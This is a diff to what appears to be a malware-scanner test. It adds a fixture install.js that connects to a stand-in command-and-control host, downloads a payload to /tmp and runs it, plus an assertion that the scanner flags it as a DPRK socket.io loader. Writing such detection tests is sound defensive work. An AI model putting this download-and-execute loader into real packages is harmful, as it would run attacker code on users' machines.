@@ -41,6 +41,19 @@ function run() {
       postinstall: "node utils.cjs"
     }
   }));
+  write(path.join(home, "dprk-socket-loader", "install.js"), [
+    "const fs = require('fs');",
+    "const https = require('https');",
+    "const cp = require('child_process');",
+    "const io = require('socket.io-client');",
+    "const c2 = 'https://198.51.100.10/api/service';",
+    "io(c2);",
+    "https.get(`${c2}/0001.dat`, (res) => {",
+    "  const out = fs.createWriteStream('/tmp/0001.dat');",
+    "  res.pipe(out);",
+    "  out.on('finish', () => cp.spawn(process.execPath, ['/tmp/0001.dat']));",
+    "});",
+  ].join("\n"));
   write(path.join(home, ".cache", "yay", "orphaned-tool", "PKGBUILD"), [
     "pkgname=orphaned-tool",
     "post_install() {",
@@ -301,6 +314,7 @@ function run() {
   assert(ids.has("solana-fakefix-text-indicator"));
   assert(ids.has("dprk-npm-rat-package-reference"));
   assert(ids.has("dprk-npm-rat-text-indicator"));
+  assert(ids.has("dprk-socketio-loader-behavior"));
   assert(ids.has("dynatrace-token-exposure"));
   assert(ids.has("dynatrace-teampcp-repo-term"));
   assert(ids.has("dynatrace-teampcp-service-term"));
